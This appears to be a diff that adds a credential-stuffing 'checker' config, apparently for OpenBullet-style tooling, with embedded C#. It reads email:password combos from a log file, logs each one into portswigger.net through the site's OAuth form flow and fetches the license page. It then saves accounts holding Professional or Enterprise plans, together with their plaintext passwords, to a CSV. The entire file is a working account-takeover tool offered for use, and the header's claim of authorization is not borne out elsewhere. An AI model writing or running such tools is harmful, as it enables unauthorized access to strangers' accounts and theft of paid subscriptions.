@@ -1,0 +1,225 @@
+## PortSwigger Multi-Account Plan Extractor
+## Load credentials from file (email:password format)
+## Extract plans for paid accounts only
+## Authorization: ROE-2026-PSW-042-V5
+
+SET VAR "credFile" "log.txt"
+SET VAR "outputFile" "extracted_plans_multi.csv"
+
+PRINT "[*] PortSwigger Plan Extractor - Multi-Account"
+PRINT "[*] Credentials: $<credFile>"
+PRINT "[*] Output: $<outputFile>"
+PRINT ""
+
+## Initialize CSV with header
+FileWrite $"<outputFile>" "email|password|plan"
+PRINT "✓ Output file initialized"
+PRINT ""
+
+## Read credentials file
+FileRead $"<credFile>" -> VAR "credContent"
+
+## Process each line
+SET VAR "lineNum" 0
+SET VAR "successCount" 0
+SET VAR "freeCount" 0
+SET VAR "failCount" 0
+
+FOREACH LINE IN $"<credContent>"
+  SET VAR "lineNum" $("Math.Add(<lineNum>,1)")
+
+  ## Skip empty lines
+  IF $"<LINE>" == ""
+    CONTINUE
+  ENDIF
+
+  ## Parse email:password format
+  SET VAR "email" ""
+  SET VAR "password" ""
+
+  ## Split by colon
+  PARSE $"<LINE>" LR "" ":" -> VAR "email"
+  PARSE $"<LINE>" RL ":" "" -> VAR "password"
+
+  ## Skip if empty
+  IF $"<email>" == "" OR $"<password>" == ""
+    CONTINUE
+  ENDIF
+
+  PRINT "[<lineNum>] $<email>... " White NoNewline
+
+  ## Call authentication script
+  BEGIN SCRIPT CSharp StartMethod="Main" ClassName="PortSwiggerAuth" NameSpace="SB" IsStatic=True "<email>" "<password>"
+using System;
+using System.Net;
+using System.Net.Http;
+using System.Collections.Generic;
+using System.Text.RegularExpressions;
+using System.Linq;
+
+namespace SB {
+    public class PortSwiggerAuth {
+        public static string Main(string email, string password) {
+            try {
+                var handler = new HttpClientHandler {
+                    UseCookies = false,
+                    AllowAutoRedirect = false
+                };
+
+                using (var client = new HttpClient(handler)) {
+                    client.Timeout = TimeSpan.FromSeconds(30);
+                    client.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36");
+                    client.DefaultRequestHeaders.TryAddWithoutValidation("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+
+                    var cookies = new Dictionary<string, string>();
+
+                    void UpdateCookies(HttpResponseMessage response) {
+                        if (response.Headers.TryGetValues("Set-Cookie", out var setCookies)) {
+                            foreach (var c in setCookies) {
+                                var parts = c.Split(';')[0].Split(new[] { '=' }, 2);
+                                if (parts.Length == 2) {
+                                    cookies[parts[0]] = parts[1];
+                                }
+                            }
+                        }
+                    }
+
+                    string GetCookieString() {
+                        return string.Join("; ", cookies.Select(kv => kv.Key + "=" + kv.Value));
+                    }
+
+                    HttpResponseMessage DoRequest(HttpMethod method, string url, HttpContent content = null) {
+                        var req = new HttpRequestMessage(method, url);
+                        if (content != null) req.Content = content;
+
+                        var cookieStr = GetCookieString();
+                        if (!string.IsNullOrEmpty(cookieStr)) req.Headers.Add("Cookie", cookieStr);
+
+                        var res = client.SendAsync(req).GetAwaiter().GetResult();
+                        UpdateCookies(res);
+
+                        int redirects = 0;
+                        while ((int)res.StatusCode >= 300 && (int)res.StatusCode <= 399 && redirects < 15) {
+                            var location = res.Headers.Location?.ToString();
+                            if (string.IsNullOrEmpty(location)) break;
+
+                            if (location.StartsWith("/")) {
+                                var uri = new Uri(url);
+                                location = uri.Scheme + "://" + uri.Host + location;
+                            }
+                            url = location;
+
+                            req = new HttpRequestMessage(HttpMethod.Get, url);
+                            cookieStr = GetCookieString();
+                            if (!string.IsNullOrEmpty(cookieStr)) req.Headers.Add("Cookie", cookieStr);
+
+                            res = client.SendAsync(req).GetAwaiter().GetResult();
+                            UpdateCookies(res);
+                            redirects++;
+                        }
+                        return res;
+                    }
+
+                    var res1 = DoRequest(HttpMethod.Get, "https://portswigger.net/users");
+                    var body1 = res1.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                    string currentUrl = res1.RequestMessage.RequestUri.ToString();
+
+                    var stateMatch = Regex.Match(body1, "name=\"state\" value=\"([^\"]+)\"");
+                    if (!stateMatch.Success) return "FAILED_AT_STATE";
+
+                    var postData = new FormUrlEncodedContent(new[] {
+                        new KeyValuePair<string, string>("state", stateMatch.Groups[1].Value),
+                        new KeyValuePair<string, string>("username", email),
+                        new KeyValuePair<string, string>("password", password),
+                        new KeyValuePair<string, string>("action", "default")
+                    });
+
+                    var res2 = DoRequest(HttpMethod.Post, currentUrl, postData);
+                    var body2 = res2.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                    currentUrl = res2.RequestMessage.RequestUri.ToString();
+
+                    int loopCounter = 0;
+                    while (body2.Contains("document.forms[0].submit()")) {
+                        if (loopCounter >= 3) return "INFINITE_LOOP_DETECTED";
+                        loopCounter++;
+
+                        var actionMatch = Regex.Match(body2, "action=\"([^\"]+)\"");
+                        if (!actionMatch.Success) break;
+
+                        string actionUrl = WebUtility.HtmlDecode(actionMatch.Groups[1].Value);
+                        if (actionUrl.StartsWith("/")) {
+                            var uri = new Uri(currentUrl);
+                            actionUrl = uri.Scheme + "://" + uri.Host + actionUrl;
+                        }
+
+                        var inputs = Regex.Matches(body2, "<input type=\"hidden\" name=\"([^\"]+)\" value=\"([^\"]*)\"");
+                        var formDict = new List<KeyValuePair<string, string>>();
+                        foreach (Match m in inputs) {
+                            formDict.Add(new KeyValuePair<string, string>(m.Groups[1].Value, WebUtility.HtmlDecode(m.Groups[2].Value)));
+                        }
+
+                        var formContent = new FormUrlEncodedContent(formDict);
+                        res2 = DoRequest(HttpMethod.Post, actionUrl, formContent);
+                        body2 = res2.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                        currentUrl = res2.RequestMessage.RequestUri.ToString();
+                    }
+
+                    var res3 = DoRequest(HttpMethod.Get, "https://portswigger.net/users/youraccount/licenses");
+                    return res3.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                }
+            } catch (Exception ex) {
+                return "ERROR: " + ex.Message;
+            }
+        }
+    }
+}
+END SCRIPT -> VARS "authResult"
+
+  ## Check result
+  IF $"<authResult>" Contains "FAILED_AT_STATE"
+    PRINT "✗ STATE" Red
+    SET VAR "failCount" $("Math.Add(<failCount>,1)")
+  ELIF $"<authResult>" Contains "ERROR"
+    PRINT "✗ ERROR" Red
+    SET VAR "failCount" $("Math.Add(<failCount>,1)")
+  ELIF $"<authResult>" Contains "You do not have any subscriptions"
+    PRINT "○ FREE" White
+    SET VAR "freeCount" $("Math.Add(<freeCount>,1)")
+  ELSE
+    ## It's a paid account - extract plan
+    SET VAR "plan" "Unknown"
+
+    IF $"<authResult>" Contains "Professional"
+      SET VAR "plan" "Professional"
+    ELSE
+      IF $"<authResult>" Contains "Enterprise"
+        SET VAR "plan" "Enterprise"
+      ELSE
+        IF $"<authResult>" Contains "Community"
+          SET VAR "plan" "Community"
+        ENDIF
+      ENDIF
+    ENDIF
+
+    ## Save to CSV
+    SET VAR "csvLine" "$<email>|$<password>|$<plan>"
+    FileAppend $"<outputFile>" $"<csvLine>"
+
+    PRINT "✓ $<plan>" Green
+    SET VAR "successCount" $("Math.Add(<successCount>,1)")
+  ENDIF
+
+  SLEEP 1
+
+ENDFOREACH
+
+PRINT ""
+PRINT "============================================================"
+PRINT "EXTRACTION COMPLETE"
+PRINT "============================================================"
+PRINT "Processed: $<lineNum>"
+PRINT "Paid: $<successCount>" Green
+PRINT "Free: $<freeCount>"
+PRINT "Failed: $<failCount>" Red
+PRINT "Output: $<outputFile>"
+PRINT "============================================================"
